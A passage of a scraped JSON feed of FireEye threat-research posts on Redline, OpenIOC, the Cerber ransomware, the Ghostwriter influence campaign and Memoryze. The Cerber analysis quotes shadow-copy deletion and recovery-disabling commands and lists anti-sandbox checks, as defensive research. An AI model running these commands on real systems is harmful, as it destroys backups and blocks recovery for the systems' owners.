crime and their possession of cyber espionage capabilities, the uniqueness of this combination will likely not last long-term as rising cyber powers may see similar potential. Cyber criminals may no longer be the only nefarious actors in this space.</p>","descriptionType":"html","publishedDate":"Mon, 11 Sep 2017 21:00:00 +0000","feedId":1226,"bgimg":"","linkMd5":"e574c5760a11608407d8ffa070eab347","bgimgJsdelivr":"","metaImg":"","author":"Luke McNamara","publishedOrCreatedDate":1598278264191},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Freeware Release: Redline 1.7","link":"http://www.fireeye.com/blog/threat-research/2012/12/freeware-release-redline-17.html","description":"<div class=\"c00 c00v1\"> \n <p>Redline™ is Mandiant's free tool for investigating hosts for signs of malicious activity through memory and file analysis, and subsequently developing a threat assessment profile. It combines configurable collection of Mandiant's full range of forensic artifacts (the same set available to our enterprise product, <a href=\"http://www.mandiant.com/products/platform/\">Mandiant Intelligent Response®</a>, guided analysis, Mandiant's Custom Malware Risk Index (MRI) scoring, and <a href=\"http://www.openioc.org/\">Indicator of Compromise (IOC)</a> matching) to provide you with the tools needed to rapidly triage a potentially compromised host.</p> \n <p>Recently, we released <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline version 1.7</a>. To make this the most compelling release to date, we focused on two of the most frequently requested features: Timeline and Search.</p> \n <p> <b>Timeline</b></p> \n <p>With Timeline, we wanted to do more than just slap together all date related items into a staggering list that buries you under more data than is humanly possible to review. Even on infrequently used systems, hundreds of thousands of dated artifacts are collected using the Redline Comprehensive Collector. To help narrow a complete timeline down to a manageable subset of data we have provided you with a trio of powerful filtering capabilities: Field Filters, TimeWrinkle™ and TimeCrunch™.</p> \n <p>You can use these filters to shave down your timeline to a manageable number of events . We have made it simple to quickly scan your list for suspicious activity by providing you with a summary column that highlights valuable information about any given event. But do not fear, if you need to investigate any item in further detail, you can select that event and choose the \"Show Details\" button to view everything we have collected.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-The-new-Timeline-view-in-Redline.png\"><img width=\"300\" height=\"205\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-The-new-Timeline-view-in-Redline-300x205.png\" title=\"Figure 1: The new Timeline view in Redline\" class=\"size-medium wp-image-3999\" /></a>Figure 1: The new Timeline view in Redline\n <p> <b>Field Filters</b></p> \n <p>Field filters are a straightforward means of excluding or including entire categories of time related events from your view by simply checking those that you care about. For example, we often find that File Accessed events tend to be very noisy. With field filters you can remove them from view until they are absolutely necessary.</p> \n <p>Even when you use field filters, we realized that there was still too much data for manual review. Naturally, we turned to our expert professional services consultants to see how they comb through large quantities of time-oriented data. Unable to find a good solution that met their needs, they developed the concepts of TimeWrinkle and TimeCrunch. We worked closely with them to bring these tools to Redline's new Timeline capabilities.</p> \n <p> <b>TimeWrinkle™</b></p> \n <p>TimeWrinkle provides you with the means to filter your Timeline view to display only the events that occurred in a set of configurable windows of time. TimeWrinkle comes in two varieties: custom and item-based. Choosing which variety to use and when simply depends on the type of investigative lead you start with.</p> \n <p>If you know the general time when suspected malicious activity occurred (whether from a user IT ticket, an IDS log, or some other similar means) you use a custom TimeWrinkle to restrict your timeline to only events that took place around that region of time. If the default five minute window radius is not sufficient, you can adjust it anywhere between 0 and 60 minutes to better suit your needs.</p> \n <p>However, if you know something more specific about the suspected malicious activity (such as a file name or MD5 checksum) you can use an item-based TimeWrinkle. Creating an item-based TimeWrinkle will take a selected item (e.g. File, Registry Key, Process, etc.) and narrow your timeline to events that take place around any of the of the associated timestamps for that item. To create an item-based TimeWrinkle, right click on any item in the Timeline and select \"Add New TimeWrinkle\". This will use default settings to generate a TimeWrinkle around the selected item which can then be edited to exclude, include, or adjust any of the individual field windows within the TimeWrinkle.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Timeline-Configuration.png\"><img width=\"300\" height=\"155\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Timeline-Configuration-300x155.png\" title=\"Figure 2: Timeline Configuration\" class=\"size-medium wp-image-4000\" /></a>Figure 2: Timeline Configuration\n <p> <b>TimeCrunch™</b></p> \n <p>There can still be times where you have too much data to review manually even after you have trimmed your timeline to a narrow window using TimeWrinkles. To further aid you in reducing your data, we also provide the ability to trim out a minute worth of events for a specific field by using a TimeCrunch. TimeCrunches are useful when Field Filters (being applied so broadly) are detrimental to your investigation, and instead you need to remove specific event types in a more surgical manner.</p> \n <p>The most common example of this is when an antivirus scan updates the file accessed timestamp on a very large number of files in a very short amount of time. When this occurs, the file accessed timestamp will become too noisy to be of investigative use for the window in which the antivirus scan ran. Applying a TimeCrunch can quickly exclude a minute worth of this cluttersome data without losing potentially relevant file accessed timestamps elsewhere in your timeline as with Field Filters.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-TimeCrunch.png\"><img width=\"300\" height=\"155\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-TimeCrunch-300x155.png\" title=\"Figure 3: TimeCrunch\" class=\"size-medium wp-image-4001\" /></a>Figure 3: TimeCrunch\n <p> <b>Search</b></p> \n <p>Now you are probably saying to yourself, \"Timeline sounds awesome, but what do I do if my investigative lead is not something that is time based?\" For example, what do you do if your lead is a potentially compromised credit card number. No worries, we have considered you as well.</p> \n <p>Now standard on every list shaped view in Redline is a full featured search capability. For example, by using the search feature you can quickly search the entire list of strings from all processes in memory to determine if the suspect credit card number was present. If any matches are found, we will highlight and scroll to each of them. And if your investigative lead is less specific (e.g. you suspect that some unknown credit card numbers may have been stolen) we also allow you to specify your search criteria as a Regular Expression.</p> \n <p>For our current Redline users, <a href=\"http://www.mandiant.com/products/free_software/redline/\">upgrade</a> to this latest version of the freeware tool to take advantage of the new features. For new users, don't wait another minute to download <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline</a> and get your hands on this great set of analysis tools. Please be sure to check out the updated user documentation for more details and drop by the <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline section</a> of the Mandiant forums to give us feedback on your experience and post any questions you may have.</p> \n <p>Lastly, be sure to tune in to our upcoming <a href=\"https://event.on24.com/eventRegistration/EventLobbyServlet?target=registration.jsp&amp;eventid=556368&amp;sessionid=1&amp;key=694A647B92A9B742A4F585401689372F&amp;sourcepage=register\">Tools of Engagement Webinar</a> on Thursday, Jan. 10<sup>th</sup> where we will be putting these new features to use in a live demo investigation of a host suspected of being compromised by an APT-type attack.</p> \n</div>","descriptionType":"html","publishedDate":"Mon, 17 Dec 2012 20:20:04 +0000","feedId":1226,"bgimg":"","linkMd5":"23d1ff88983905cf128b9af70d7be70b","bgimgJsdelivr":"","metaImg":"","author":"Ted Wilson","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-The-new-Timeline-view-in-Redline-300x205.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn74@2020_2/2020/08/24/14-11-13-519_6903d5f276223217.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Timeline-Configuration-300x155.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn63@2020_1/2020/08/24/14-11-15-102_040d77c102953356.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-TimeCrunch-300x155.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn41@2020_5/2020/08/24/14-11-13-213_de0613aec1710079.webp"},"publishedOrCreatedDate":1598278264211},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"OpenIOC: Back to the Basics","link":"http://www.fireeye.com/blog/threat-research/2013/10/openioc-basics.html","description":"<div class=\"c00 c00v1\"> \n <p> <i>Written by Will Gibb &amp; Devon Kerr</i></p> \n <p>One challenge investigators face during incident response is finding a way to organize information about an attackers' activity, utilities, malware and other indicators of compromise, called IOCs. The <a href=\"http://www.openioc.org/\" target=\"_blank\">OpenIOC format</a> addresses this challenge head-on. OpenIOC provides a standard format and terms for describing the artifacts encountered during the course of an investigation. In this post we're going to provide a high-level overview of IOCs, including IOC use cases, the structure of an IOC and IOC logic.</p> \n <p>Before we continue, it's important to mention that IOCs are not signatures, and they aren't meant to function as a signature would. It is often understated, but an IOC is meant to be used in combination with human intelligence. IOCs are designed to aid in your investigation, or the investigations of others with whom you share threat intelligence.</p> \n <h4>IOC Use Cases:</h4> \n <p>There are several use cases for codifying your IOCs, and these typically revolve around your objectives as an investigator. The number of potential use cases is quite large, and we've listed some of the most common use cases below:</p> \n <ul> \n  <li> <b>Find malware/utility</b>: This is the most common use case. Essentially, this is an IOC written to find some type of known malware or utility, either by looking for attributes of the binary, itself, or for some artifact created upon execution, such as a prefetch file or registry key.</li> \n  <li> <b>Methodology</b>: Unlike an IOC written to identify malware or utilities, these IOCs find things you don't necessarily know about, in order to generate investigative leads. For example, if you wanted to identify any service DLL that wasn't signed and which was loaded from any directory that did not include the path \"windowssystem32\", you could write an IOC to describe that condition. Another good example of a methodology IOC is an IOC that looks for the Registry text value of all \"Run\" keys for a string ending \".jpg\". This represents an abnormal condition which upon investigation may lead to evidence of a compromise.</li> \n  <li> <b>Bulk</b>: You may already be using this kind of IOC. Many organizations subscribe to threat intelligence feeds that deliver a list of MD5s or IP addresses; a bulk IOC can represent a collection of those indicators. These kinds of IOCs are very black and white and are typically only good for an exact match.</li> \n  <li> <b>Investigative</b>: As you investigate systems in an environment and identify evidence of malicious activity such as metadata related to the installation of backdoors, execution of tools, or files being staged for theft, you can track that information in an IOC. These IOCs are similar to bulk IOCs; however, an investigative IOC only contains indicators from a single investigation. Using this type of IOC can help you to prioritize which systems you want to analyze.</li> \n </ul> \n <h4>IOC components:</h4> \n <p>An IOC is made up of three main parts: IOC metadata, references and the definition. Let's examine each one of these more closely, noting that we're using the Mandiant <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-editor.html\">IOC Editor (IOCe)</a> downloadable from the Mandiant website:</p> \n <p> <i>Metadata</i>: IOC metadata describes information like the author of the IOC (jsmith@domain.tld), the name of the IOC (Evil.exe (BACKDOOR) and a brief description such as \"This variant of the open source Poison Ivy backdoor has been configured to beacon to 10.127.10.128 and registers itself as \"Microsoft 1atent time services\".</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-11.png\"><img width=\"512\" height=\"164\" class=\"alignnone  wp-image-5215\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-11.png\" /></a></p> \n <p> <i>References</i>: Within the IOC, references can find information like the name of an investigation or case number, comments and information on the maturity of the IOC such as Alpha, Beta, Release, etc. This data can help you to understand where the IOC fits in your library of threat intelligence. One common use for references is to associate an IOC with a particular threat group. It is not uncommon for certain references to be removed from IOCs when sharing IOCs with third parties.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-21.png\"><img width=\"397\" height=\"114\" class=\"alignnone  wp-image-5216\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-21.png\" /></a></p> \n <p> <i>Definition</i>: This is the content of the IOC, containing the artifacts that an investigator decided to codify in the IOC. For example, these may include the MD5 of a file, a registry path or something found in process memory. Inside the definition, indicators are listed out or combined into expressions that consist of two terms and some form of Boolean logic.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-31.png\"><img width=\"379\" height=\"121\" class=\"alignnone size-full wp-image-5217\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Image-31.png\" /></a></p> \n <p>One thing about the OpenIOC format that makes it particularly useful is the ability to combine similar terms using Boolean AND &amp; OR logic. The previous example shows how this type of logic can be used. This type of IOC describes three possible scenarios:</p> \n <ol> \n  <li>The name of a service is \"MS 1atent time services\" <b>- OR -</b></li> \n  <li>The ServiceDLL name for any service contains \"evil.exe\" <b>- OR -</b></li> \n  <li>The filename is \"bad.exe\" <b>AND</b> the filesize attribute of that file is within the range 4096 to 10240 bytes.</li> \n </ol> \n <p>When you use Boolean logic, remember the following:</p> \n <ul> \n  <li>An AND requires that both sides of the expression are true</li> \n  <li>An OR requires that one side of the expression is true</li> \n </ul> \n <p>Understanding that the Boolean statements, such as 'The name of a service is \"MS 1atent time services\", <b>OR </b>\"filename is \"bad.exe\" <b>AND</b> the filesize attribute of that file is within the range 4096 to 10240 bytes\"', are evaluated separately is an important aspect understanding how the logic within an IOC works. These statements are not if-else statements, nor do they both have to exist in order for the IOC to have a match. When investigating a host, if the \"MS 1atent time services\" service is present, this IOC would have a match; regardless of whether or not the malicious file the IOC described was present on the host as well.</p> \n <p>In our next post we're going to have a crash course in writing IOC definitions using the Mandiant IOC editor, IOCe.&nbsp;</p> \n</div>","descriptionType":"html","publishedDate":"Tue, 01 Oct 2013 18:45:52 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/ammo/Image-11.png","linkMd5":"20ce2231b2c2aaabe2a32818aa16b711","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn13@2020_1/2020/08/24/14-11-04-896_29d03f59fb2051b9.webp","destWidth":854,"destHeight":273,"sourceBytes":11885,"destBytes":34300,"author":"Will Gibb","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/Image-11.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn13@2020_1/2020/08/24/14-11-04-896_29d03f59fb2051b9.webp","https://www.fireeye.com/content/dam/legacy/ammo/Image-21.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn72@2020_5/2020/08/24/14-11-20-255_09ec98c489a3e184.webp","https://www.fireeye.com/content/dam/legacy/ammo/Image-31.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn95@2020_2/2020/08/24/14-11-09-209_1cd7083a9f3519b3.webp"},"publishedOrCreatedDate":1598278264207},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Cerber: Analyzing a Ransomware Attack Methodology To Enable Protection","link":"http://www.fireeye.com/blog/threat-research/2016/07/cerber-ransomware-attack.html","description":"<p>Ransomware is a common method of cyber extortion for financial gain that typically involves users being unable to interact with their files, applications or systems until a ransom is paid. Accessibility of cryptocurrency such as Bitcoin has directly contributed to this ransomware model. Based on data from FireEye Dynamic Threat Intelligence (DTI), ransomware activities have been <a href=\"https://www.fireeye.com/blog/threat-research/2016/05/ransomware_activity.html\">rising fairly steadily</a> since mid-2015.</p> \n<p>On June 10, 2016, FireEye’s HX detected a Cerber ransomware campaign involving the distribution of emails with a malicious Microsoft Word document attached. If a recipient were to open the document a malicious macro would contact an attacker-controlled website to download and install the Cerber family of ransomware.</p> \n<p>Exploit Guard, a major new feature of <a href=\"https://www.fireeye.com/products/hx-endpoint-security-products.html\">FireEye Endpoint Security (HX)</a>, detected the threat and alerted HX customers on infections in the field so that organizations could inhibit the deployment of Cerber ransomware. After investigating further, the FireEye research team worked with security agency CERT-Netherlands, as well as web hosting providers who unknowingly hosted the Cerber installer, and were able to shut down that instance of the Cerber command and control (C2) within hours of detecting the activity. With the attacker-controlled servers offline, macros and other malicious payloads configured to download are incapable of infecting users with ransomware.</p> \n<p>FireEye hasn’t seen any additional infections from this attacker since shutting down the C2 server, although the attacker could configure one or more additional C2 servers and resume the campaign at any time. This particular campaign was observed on six unique endpoints from three different FireEye endpoint security customers. HX has proven effective at detecting and inhibiting the success of Cerber malware.</p> \n<h5>Attack Process</h5> \n<p>The Cerber ransomware attack cycle we observed can be broadly broken down into eight steps:</p> \n<ol> \n <li>Target receives and opens a Word document.</li> \n <li>Macro in document is invoked to run PowerShell in hidden mode.</li> \n <li>Control is passed to PowerShell, which connects to a malicious site to download the ransomware.</li> \n <li>On successful connection, the ransomware is written to the disk of the victim.</li> \n <li>PowerShell executes the ransomware.</li> \n <li>The malware configures multiple concurrent persistence mechanisms by creating command processor, screensaver, startup.run and runonce registry entries.</li> \n <li>The executable uses native Windows utilities such as WMIC and/or VSSAdmin to delete backups and shadow copies.</li> \n <li>Files are encrypted and messages are presented to the user requesting payment.</li> \n</ol> \n<p>Rather than waiting for the payload to be downloaded or started around stage four or five of the aforementioned attack cycle, Exploit Guard provides coverage for most steps of the attack cycle – beginning in this case at the second step.</p> \n<p>The most common way to deliver ransomware is via Word documents with embedded macros or a Microsoft Office exploit. FireEye Exploit Guard detects both of these attacks at the initial stage of the attack cycle.</p> \n<h5>PowerShell Abuse</h5> \n<p>When the victim opens the attached Word document, the malicious macro writes a small piece of VBScript into memory and executes it. This VBScript executes PowerShell to connect to an attacker-controlled server and download the ransomware (profilest.exe), as seen in Figure 1.<img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig1.png\" /></p> \n<p> <span class=\"type-XS\">Figure 1. Launch sequence of Cerber – the macro is responsible for invoking PowerShell and PowerShell downloads and runs the malware</span></p> \n<p>It has been increasingly common for threat actors to use malicious macros to infect users because the majority of organizations permit macros to run from Internet-sourced office documents.</p> \n<p>In this case we observed the macrocode calling PowerShell to bypass execution policies – and run in hidden as well as encrypted mode – with the intention that PowerShell would download the ransomware and execute it without the knowledge of the victim.</p> \n<p>Further investigation of the link and executable showed that every few seconds the malware hash changed with a more current compilation timestamp and different appended data bytes – a technique often used to evade hash-based detection.</p> \n<h4>Cerber in Action</h4> \n<h5>Initial payload behavior</h5> \n<p>Upon execution, the Cerber malware will check to see where it is being launched from. Unless it is being launched from a specific location (%APPDATA%\\&amp;#60GUID&amp;#62), it creates a copy of itself in the victim's %APPDATA% folder under a filename chosen randomly and obtained from the %WINDIR%\\system32 folder.</p> \n<p>If the malware is launched from the specific aforementioned folder and after eliminating any blacklisted filenames from an internal list, then the malware creates a renamed copy of itself to “%APPDATA%\\&amp;#60GUID&amp;#62” using a pseudo-randomly selected name from the “system32” directory. The malware executes the malware from the new location and then cleans up after itself.</p> \n<h5>Shadow deletion</h5> \n<p>As with many other ransomware families, Cerber will bypass UAC checks, delete any volume shadow copies and disable safe boot options. Cerber accomplished this by launching the following processes using respective arguments:</p> \n<p>Vssadmin.exe \"delete shadows /all /quiet\"</p> \n<p>WMIC.exe \"shadowcopy delete\"</p> \n<p>Bcdedit.exe \"/set {default} recoveryenabled no\"</p> \n<p>Bcdedit.exe \"/set {default} bootstatuspolicy ignoreallfailures</p> \n<h5>Coercion</h5> \n<p>People may wonder why victims pay the ransom to the threat actors. In some cases it is as simple as needing to get files back, but in other instances a victim may feel coerced or even intimidated. We noticed these tactics being used in this campaign, where the victim is shown the message in Figure 2 upon being infected with Cerber.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig2.png\" /></p> \n<p> <span class=\"type-XS\">Figure 2. A message to the victim after encryption</span></p> \n<p>The ransomware authors attempt to incentivize the victim into paying quickly by providing a 50 percent discount if the ransom is paid within a certain timeframe, as seen in Figure 3.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig3.jpeg\" /></p> \n<p>&nbsp;</p> \n<p>&nbsp;</p> \n<p> <span class=\"type-XS\">Figure 3. Ransom offered to victim, which is discounted for five days</span></p> \n<h5>Multilingual Support</h5> \n<p>As seen in Figure 4, the Cerber ransomware presented its message and instructions in 12 different languages, indicating this attack was on a global scale.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig4.jpeg\" /></p> \n<p> <span class=\"type-XS\">Figure 4.&nbsp;&nbsp; Interface provided to the victim to pay ransom supports 12 languages</span></p> \n<h5>Encryption</h5> \n<p>Cerber targets 294 different file extensions for encryption, including .doc (typically Microsoft Word documents), .ppt (generally Microsoft PowerPoint slideshows), .jpg and other images. It also targets financial file formats such as. ibank (used with certain personal finance management software) and .wallet (used for Bitcoin).</p> \n<h5>Selective Targeting</h5> \n<p>Selective targeting was used in this campaign. The attackers were observed checking the country code of a host machine’s public IP address against a list of blacklisted countries in the JSON configuration, utilizing online services such as ipinfo.io to verify the information. Blacklisted (protected) countries include: <i>Armenia, Azerbaijan, Belarus, Georgia, Kyrgyzstan, Kazakhstan, Moldova, Russia, Turkmenistan, Tajikistan, Ukraine, and Uzbekistan</i>.</p> \n<p>The attack also checked a system's keyboard layout to further ensure it avoided infecting machines in the attackers geography: <i>1049—Russian, ¨ 1058—Ukrainian, 1059—Belarusian, 1064—Tajik, 1067—Armenian, 1068—Azeri, (Latin), 1079—Georgian, 1087—Kazakh, 1088—Kyrgyz (Cyrillic), 1090—Turkmen, 1091—Uzbek (Latin), 2072—Romanian (Moldova), 2073—Russian (Moldova), 2092—Azeri (Cyrillic), 2115—Uzbek (Cyrillic).</i></p> \n<p>Selective targeting has historically been used to keep malware from infecting endpoints within the author’s geographical region, thus protecting them from the wrath of local authorities. The actor also controls their exposure using this technique. In this case, there is reason to suspect the attackers are based in Russia or the surrounding region.</p> \n<h5>Anti VM Checks</h5> \n<p>The malware searches for a series of hooked modules, specific filenames and paths, and known sandbox volume serial numbers, including: sbiedll.dll, dir_watch.dll, api_log.dll, dbghelp.dll, Frz_State, C:\\popupkiller.exe, C:\\stimulator.exe, C:\\TOOLS\\execute.exe, \\sand-box\\, \\cwsandbox\\, \\sandbox\\, 0CD1A40, 6CBBC508, 774E1682, 837F873E, 8B6F64BC.</p> \n<p>Aside from the aforementioned checks and blacklisting, there is also a wait option built in where the payload will delay execution on an infected machine before it launches an encryption routine. This technique was likely implemented to further avoid detection within sandbox environments.</p> \n<h5>Persistence</h5> \n<p>Once executed, Cerber deploys the following persistence techniques to make sure a system remains infected:</p> \n<ul> \n <li>A registry key is added to launch the malware instead of the screensaver when the system becomes idle.</li> \n <li>The “CommandProcessor” Autorun keyvalue is changed to point to the Cerber payload so that the malware will be launched each time the Windows terminal, “cmd.exe”, is launched.</li> \n <li>A shortcut (.lnk) file is added to the startup folder. This file references the ransomware and Windows will execute the file immediately after the infected user logs in.</li> \n <li>Common persistence methods such as run and runonce key are also used.</li> \n</ul> \n<h5>A Solid Defense<br /> </h5> \n<p>Mitigating ransomware malware has become a high priority for affected organizations because passive security technologies such as signature-based containment have proven ineffective.<br /> <br /> Malware authors have demonstrated an ability to outpace most endpoint controls by compiling multiple variations of their malware with minor binary differences. By using alternative packers and compilers, authors are increasing the level of effort for researchers and reverse-engineers. Unfortunately, those efforts don’t scale.<br /> <br /> Disabling support for macros in documents from the Internet and increasing user awareness are two ways to reduce the likelihood of infection. If you can, consider blocking connections to websites you haven’t explicitly whitelisted. However, these controls may not be sufficient to prevent all infections or they may not be possible based on your organization.<br /> <br /> <a href=\"http://www.fireeye.com/content/fireeye-www/site-content/en_US/retired-pages-do-not-activate/hx-endpoint-security-datasheet-pf-ep.html\" target=\"_blank\">FireEye Endpoint Security</a> with Exploit Guard helps to detect exploits and techniques used by ransomware attacks (and other threat activity) during execution and provides analysts with greater visibility. This helps your security team conduct more detailed investigations of broader categories of threats. This information enables your organization to quickly stop threats and adapt defenses as needed.</p> \n<h5>Conclusion</h5> \n<p>Ransomware has become an increasingly common and effective attack affecting enterprises, impacting productivity and preventing users from accessing files and data.</p> \n<p>Mitigating the threat of ransomware requires strong endpoint controls, and may include technologies that allow security personnel to quickly analyze multiple systems and correlate events to identify and respond to threats.</p> \n<p> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/endpoint-security.html\" target=\"_blank\">HX with Exploit Guard</a> uses behavioral intelligence to accelerate this process, quickly analyzing endpoints within your enterprise and alerting your team so they can conduct an investigation and scope the compromise in real-time.</p> \n<p>Traditional defenses don’t have the granular view required to do this, nor can they connect the dots of discreet individual processes that may be steps in an attack. This takes behavioral intelligence that is able to quickly analyze a wide array of processes and alert on them so analysts and security teams can conduct a complete investigation into what has, or is, transpiring. This can only be done if those professionals have the right tools and the visibility into all endpoint activity to effectively find every aspect of a threat and deal with it, all in real-time. Also, at FireEye, we go one step ahead and contact relevant authorities to bring down these types of campaigns.</p> \n<p>Click <a href=\"http://investors.fireeye.com/releasedetail.cfm?ReleaseID=958361\">here</a> for more information about Exploit Guard technology.</p>","descriptionType":"html","publishedDate":"Mon, 18 Jul 2016 12:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig1.png","linkMd5":"96fa4bb4ee3d183782135b1a3316ab31","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn44@2020_4/2020/08/24/14-11-04-848_e53bfda267ad1aa8.webp","destWidth":626,"destHeight":459,"sourceBytes":56293,"destBytes":17644,"author":"Ankit Anubhav ","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig1.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn44@2020_4/2020/08/24/14-11-04-848_e53bfda267ad1aa8.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig2.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn2@2020_2/2020/08/24/14-11-16-969_826c40dcc3d7749e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig3.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn47@2020_3/2020/08/24/14-11-18-344_2df50133dfaf2d74.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig4.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn24@2020_5/2020/08/24/14-11-19-830_e9ef104aa141bbb0.webp"},"publishedOrCreatedDate":1598278264198},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"'Ghostwriter' Influence Campaign: Unknown Actors Leverage Website\nCompromises and Fabricated Content to Push Narratives Aligned With\nRussian Security Interests","link":"http://www.fireeye.com/blog/threat-research/2020/07/ghostwriter-influence-campaign.html","description":"<p>Mandiant Threat Intelligence has tied together several information\n  operations that we assess with moderate confidence comprise part of a\n  broader influence campaign—ongoing since at least March 2017—aligned\n  with Russian security interests. The operations have primarily\n  targeted audiences in Lithuania, Latvia, and Poland with narratives\n  critical of the North Atlantic Treaty Organization’s (NATO) presence\n  in Eastern Europe, occasionally leveraging other themes such as\n  anti-U.S. and COVID-19-related narratives as part of this broader\n  anti-NATO agenda. We have dubbed this campaign “<a href=\"https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/Ghostwriter-Influence-Campaign.pdf\">Ghostwriter</a>.”</p>\n <p>Many, though not all of the incidents we suspect to be part of the\n  Ghostwriter campaign, appear to have leveraged website compromises or\n  spoofed email accounts to disseminate fabricated content, including\n  falsified news articles, quotes, correspondence and other documents\n  designed to appear as coming from military officials and political\n  figures in the target countries.</p>\n <p>This falsified content has been referenced as source material in\n  articles and op-eds authored by at least 14 inauthentic personas\n  posing as locals, journalists and analysts within those countries.\n  These articles and op-eds, primarily written in English, have been\n  consistently published to a core set of third-party websites that\n  appear to accept user-submitted content, most notably OpEdNews.com,\n  BalticWord.com, and the pro-Russian site TheDuran.com, among others,\n  as well as to suspected Ghostwriter-affiliated blogs.</p>\n <p>Some of these incidents and personas have received public attention\n  from researchers, foreign news outlets, or government entities in\n  Lithuania and Poland, but have not been tied to a broader activity\n  set. Others have received little attention and remain relatively\n  obscure. Mandiant Threat Intelligence has independently discovered\n  several Ghostwriter personas and identified additional incidents\n  involving some of those personas previously exposed.</p>\n <p>We believe the assets and operations discussed in this <a\n  href=\"https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/Ghostwriter-Influence-Campaign.pdf\">report</a>\n  are for the first time being collectively tied together and assessed\n  to comprise part of a larger, concerted and ongoing influence campaign.</p>\n <p>Read <a\n    href=\"https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/Ghostwriter-Influence-Campaign.pdf\">the\n  report</a> today to learn more.</p>\n","descriptionType":"html","publishedDate":"Wed, 29 Jul 2020 02:15:00 +0000","feedId":1226,"bgimg":"","linkMd5":"7e97ee7a0ee9f7cbdd54d8df1155dbb1","bgimgJsdelivr":"","metaImg":"","author":"Lee Foster","publishedOrCreatedDate":1598278264176},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Memory forensics on Windows 7 (x86 and x64) and Windows 2008 x64","link":"http://www.fireeye.com/blog/threat-research/2010/09/memory-forensics-windows-7-x86-x64-windows-2008-x64.html","description":"<div class=\"c00 c00v1\"> \n <p>Next month <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html\" target=\"_blank\">Memoryze</a> will be <b>two years old</b> and a lot has changed over that time. There has been a lot of interesting research in the field of memory forensics, and responders are finding value in the analysis.</p> \n <p> <b>Platform Support</b></p> \n <p>From a tool perspective, other than the addition of a GUI called <a href=\"http://www.mandiant.com/products/free_software/mandiant_audit_viewer/\" target=\"_blank\">Audit Viewer</a> and the added usability that the <a href=\"http://www.mandiant.com/uploads/presentations/DoD_2010_PS.pdf\" target=\"_blank\">Malware Rating Index (MRI)</a> provides, the most noticeable change is the expanding platform support. Today, we are announcing the release of <b> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html\">Memoryze 1.4.2900</a></b> which has added support for:</p> \n <ul> \n  <li>Windows 7 64-bit</li> \n  <li>Windows 7 32-bit*</li> \n  <li>Windows 2008 64-bit*</li> \n </ul> \n <p>This is in addition to the platforms Memoryze already supported:</p> \n <ul> \n  <li>Windows 2000 Service Pack 4 (32-bit)</li> \n  <li>Windows XP Service Pack 2 and Service 